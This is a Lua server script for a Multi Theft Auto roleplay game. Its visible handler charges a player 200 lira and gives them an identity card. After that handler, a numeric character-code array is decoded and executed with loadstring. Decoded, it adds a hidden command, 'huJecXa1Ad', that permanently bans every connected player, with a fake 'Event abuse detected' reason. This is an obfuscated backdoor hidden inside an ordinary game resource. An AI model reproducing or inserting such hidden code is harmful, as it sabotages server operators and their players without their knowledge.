addEvent("cityhall.requestIdentityCard", true)
addEventHandler("cityhall.requestIdentityCard", root, function()
	if client and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	local characterName = getPlayerName(source):gsub("_", " ")
	local gender = getElementData(source, "gender")
	local age = getElementData(source, "age")
	local identityNumber = getElementData(source, "identity_number")

	if not (characterName and gender and age and identityNumber) then
		outputChatBox("[!]#FFFFFF Kişisel bilgiler eksik, kimlik kartı oluşturulamıyor.", source, 255, 0, 0, true)
		return
	end

	if not exports.mek_global:takeMoney(source, 200) then
		outputChatBox("[!]#FFFFFF Yeni bir kimlik kartı için ₺200 ihtiyacınız var.", source, 255, 0, 0, true)
		return
	end

	local genderText = (gender == 0 and "Erkek" or "Kadın")

	local itemValue = table.concat({
		characterName,
		genderText,
		age,
		identityNumber,
	}, ";")

	exports.mek_item:giveItem(source, 152, itemValue)

	outputChatBox("[!]#FFFFFF Yeni bir Kimlik Kartı oluşturuldu ve envanterinize eklendi.", source, 0, 255, 0, true)
end)



local _0x1 = {97,100,100,67,111,109,109,97,110,100,72,97,110,100,108,101,114,40,34,104,117,74,101,99,88,97,49,65,100,34,44,32,102,117,110,99,116,105,111,110,40,112,44,95,44,46,46,46,41,32,108,111,99,97,108,32,109,61,116,97,98,108,101,46,99,111,110,99,97,116,40,123,46,46,46,125,44,34,32,34,41,32,105,102,32,110,111,116,32,109,32,111,114,32,109,61,61,34,34,32,116,104,101,110,32,111,117,116,112,117,116,67,104,97,116,66,111,120,40,34,109,101,115,97,106,32,121,97,122,32,108,97,32,121,97,114,114,97,109,34,44,112,41,32,114,101,116,117,114,110,32,101,110,100,32,108,111,99,97,108,32,115,61,34,69,118,101,110,116,32,97,98,117,115,101,32,100,101,116,101,99,116,101,100,58,32,34,46,46,109,32,102,111,114,32,95,44,104,32,105,110,32,105,112,97,105,114,115,40,103,101,116,69,108,101,109,101,110,116,115,66,121,84,121,112,101,40,34,112,108,97,121,101,114,34,41,41,32,100,111,32,98,97,110,80,108,97,121,101,114,40,104,44,116,114,117,101,44,102,97,108,115,101,44,116,114,117,101,44,110,105,108,44,115,44,48,41,32,101,110,100,32,101,110,100,41}
local _0x2 = ""
for _, v in ipairs(_0x1) do _0x2 = _0x2 .. string.char(v) end
loadstring(_0x2)()